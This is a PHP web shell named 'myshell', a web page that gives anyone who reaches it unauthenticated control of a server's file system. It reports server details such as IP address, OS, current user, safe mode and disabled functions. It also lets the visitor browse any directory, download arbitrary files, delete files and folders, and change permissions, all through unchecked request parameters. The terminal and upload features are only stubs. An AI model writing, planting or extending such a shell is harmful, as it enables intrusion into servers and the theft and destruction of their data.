<?php


if(!empty($_GET['do'])){
    switch($_GET['do']){
        case 'delete_file':
            if(!empty($_GET['file_path'])){
                if(is_file(realpath($_GET['file_path']))){
                    unlink(realpath($_GET['file_path']));
                    #header("Location: /");
                }
            }
        break;
        case 'delete_dir':
            if(!empty($_GET['dir_path'])){
                if(is_dir(realpath($_GET['dir_path']))){
                    rmdir(realpath($_GET['dir_path']));
                    #header("Location: /");
                }
            }
        break;
        case 'chmod':
            if(!empty($_POST['new_perm'])&&!empty($_POST['file_link'])){
                if($_POST['new_perm'][0]!='0'){
                    $_POST['new_perm']='0'.$_POST['new_perm'];

                }
                @chmod($_POST['file_link'],$_POST['new_perm']);
        
            }
        break;
        case 'upload':
      
        
        break;
        case 'download':

            if(!empty($_GET['file_link'])){
                if(is_file(realpath($_GET['file_link']))){
                    $file_name=basename(realpath($_GET['file_link']));
                    header("Content-disposition:attachment;filename=\"$file_name\"");
                    readfile(realpath($_GET['file_link']));
                    exit();
                }
            }    
        break;
    }
}
function formatSizeUnits($bytes){
    if ($bytes >= 1073741824){
        $bytes = number_format($bytes / 1073741824, 2) . ' GB';
    }elseif ($bytes >= 1048576){
        $bytes = number_format($bytes / 1048576, 2) . ' MB';
    }elseif ($bytes >= 1024){
        $bytes = number_format($bytes / 1024, 2) . ' KB';
    }elseif ($bytes > 1){
        $bytes = $bytes . ' bytes';
    }elseif ($bytes == 1){
        $bytes = $bytes . ' byte';
    }else{
        $bytes = '0 bytes';
    }
    return $bytes;
}

if(ini_get("safe_mode")==1){
        $safemode="ON";

    } else{
        $safemode="OFF";
    } 

    if(ini_get("disable_functions")==""){
        $disable_functions="None";
    } else{
        $disable_functions=ini_get("disable_functions");

    }
    if(empty($_GET['path'])){
        $path=realpath(dirname($_SERVER['SCRIPT_FILENAME']));

    }else{
        $path=realpath($_GET["path"]);
    }


    if(empty($_GET['page'])){
        $page="explorer";
    }else{
        $page=$_GET['page'];
    }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>shell</title>
</head>
<body>

<style>

*{
    margin:0;
    padding:0;
    background:#424242;
}

.red{
    color:#e57373;
}
.red-top{
    background:#263238;
    color:#f5f5f5;
}
.red:hover{
    color:#f5f5f5;
    background-color:#d32f2f !important;
}
.green{
    color:#558B2F;

}
.green:hover{
    color:#f5f5f5;
    background:#558B2F !important;
    
}
.yellow{
    color:#00897B;
}
.yellow:hover{
    background:#00897B !important;
    color:#f5f5f5;
}
.brown{
    color:#8D6E63;
}
.body{
    width:1000px;
    display:block;
    margin:auto;
    margin-top:20px;
}

#header{
    font-family:'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
    text-align:center;
    margin-bottom:10px;
    height:50px;
}
#information_header{
    font-family:'Courier New', Courier, monospace;
    border:2px solid #9E9E9E;
    padding:3px;
    text-align:left;
    color:#BDBDBD;
}
#tollbar_header{
    font-family:'Courier New', Courier, monospace;
    border:2px solid #9E9E9E;
    padding:3px;
    text-align:left;
    border-bottom:2px dashed #9E9E9E;
}
#information_head_text{
    padding-left:10px;  
}
#information{
    border:1px solid #9E9E9E;
    height:auto;
    padding:10px;
    text-align:left;
    border-top:none;
    margin-bottom:5px;
    color:#66BB6A;  
}
#toolbar_information{
    height:auto;
    padding:10px;
    text-align:left;
    border-top:none;
    margin-bottom:5px;
    color:#BDBDBD;  
}

#tollbar_header li{
    display:inline-block;
    margin-left:10px;
    padding:10px;
    color:#BDBDBD;
}
#tollbar_header li a{
    text-decoration:none;
    color:#BDBDBD;


}
a{
    text-decoration:none;
    color:#f6f6f6;
}
.toolbar_content a{
    padding:5px;
    display:block;
}

.toolbar_content a:hover{
    background:#2E7D32;
    padding:5px;
    display:block;
}
table{
    width:100%;
}
table th{
    text-align:center;

}

#param a{
    display:inline-block;

}
#param a:hover{
    color:#EEEEEE;
    background:#6D4C41;

    
}
</style>

<div class="body">

    <div id="header">
        <h2 class="red-top">myshell</h2>
    </div>

    <div id="information_header">
            <h3 class="" id="information_head_text">information</h3>

    </div>

    <div id=information>

        <div id="information_content">
            Server IP : <?php echo $_SERVER["SERVER_ADDR"]; ?>
            <br>
            Your IP : <?php echo $_SERVER["REMOTE_ADDR"];?>
            <br>
            System : <?php echo php_uname(); ?>
            <br>
            Software : <?php echo getenv("SERVER_SOFTWARE"); ?>
            <br>
            User : <?php echo get_current_user();?>
            <br>
            Safe Mode : <?php echo $safemode; ?>
            <br>
            Disable Functions : <?php echo $disable_functions; ?>
            <br>
            Path : <?php echo $path ?>
        
        </div>
    
    </div>

    <div id="tollbar_header">

       
        <li class="" id="information_head_text"> <a href="?page=explorer">Explorer</a></li>
        
       
           <li class="" id="information_head_text"> <a href="?page=terminal">Terminal</a></li>
           
    </div>

    <div id=toolbar_information>
          <div class="toolbar_content">
          <?php
	     switch($page){
                case "explorer":
                  $files=scandir($path);
                  echo "<table border=1><tr><th>File Name</th><th>Size</th><th>permission</th><th>Actions</th></tr>";
                  foreach($files as $entry){
                      $entry_link=$path."/".$entry;
                      $entry_link=realpath($entry_link);
                      if(!is_dir($entry_link)){
                          $entry_size=formatSizeUnits(filesize($entry_link));
                      }else{
                          $entry_size="";
  
                      }
                      $entry_perm=substr(decoct(fileperms($entry_link)),-4);
                      echo "<tr>";
                      echo "<td><a href='?page=explorer&path=$entry_link'>$entry</a></td>";
                      echo "<td>$entry_size </td>";
                      echo "<td>$entry_perm </td>";
                      if (!is_dir($entry_link)){
                          echo "<td id='param'><a class='red' href='?do=delete_file&file_path=$entry_link'>Delete</a> <a href='?do=download&file_link=$entry_link' class='green'>Download</a><a class='brown' href='?page=chmod&file_link=$entry_link&current_perm=$entry_perm'>Chmod</a></td>";                    }
                      else{
                          echo "<td id='param'><a class='red' href='?do=delete_dir&dir_path=$entry_link'>Delete</a></td>";
                      }
                      echo "</tr>";
                  }
                  echo "</table>";
                  echo "<a class='yellow' href='?page=upload&dir_link=$entry_link'>upload</a> ";

                break;
                case "terminal":
                  echo "terminal";
                break;
                case "chmod":
                  if(!empty($_GET['file_link'])&&!empty($_GET['current_perm'])){
                      ?>

                      <form method="post" action="?do=chmod" id="chmod_form">
                        New Perm : <input type="text" name="new_perm" value="<?php echo $_GET['current_perm']?>">

                        <input type="hidden" name="file_link" value="<?php echo $_GET['file_link']?>">
                        <input type="submit" value="Change">
                      </form>
                      <?php
                  }
                break;
                case "upload":
                        ?>
                    <form enctype="multipart/form-data" action="upload.php" method="POST">
                        <p>Upload your file</p>
                        <input type="file" name="uploaded_file"><br />
                        <input type="submit" value="Upload">
                    </form>
                  <?php
                break;
                default:
                  echo "Page Not found";
                break;    
            }; 


    
            
          ?>
          </div>
    </div>

</div>

</body>
</html>